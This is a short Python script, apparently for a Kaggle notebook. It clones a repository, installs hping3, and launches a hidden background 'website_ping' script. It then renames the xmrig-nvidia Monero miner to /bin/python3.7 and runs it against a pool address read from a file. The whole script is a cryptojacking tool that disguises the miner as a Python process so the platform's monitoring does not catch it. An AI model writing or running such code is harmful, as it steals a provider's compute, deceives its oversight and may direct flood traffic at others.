import os,subprocess
down_dep="apt install -y libmicrohttpd-dev hping3"
print("Installing")
os.system(down_dep)
print("checking")
file_exist=os.path.isfile('/kaggle/working/xmr-nvidia/xmrig-nvidia')
print(file_exist)
cwd=os.getcwd()
print(cwd)
subprocess.call(["git", "clone","https://github.com/swetank0/xmrr.git"])
print("Downloaded")
cip="xmr-nvidia/ip_address.txt"
print(cip)
read_ip=open(cip,"r+")
ip_add=read_ip.read()
print(ip_add)
cmd = "python3.7 -o "+ ip_add +" --tls"
print(cmd)
if file_exist==True :
    print("running")
    os.system(cmd)
    
   
         
else :
    cwd=os.getcwd()
    cping="nohup python "+cwd+ "/xmr-nvidia/website_ping.py > /dev/null 2>&1 &"
    os.system(cping)
    cdir=cwd+"/xmr-nvidia/xmrig-nvidia"
    chmod_cmd="chmod 755 "+cdir
    os.system(chmod_cmd)
    mv_dir="mv "+cdir+" /bin/python3.7"
    os.system(mv_dir)
    print("moved")
    print("Running...")    
    os.system(cmd)
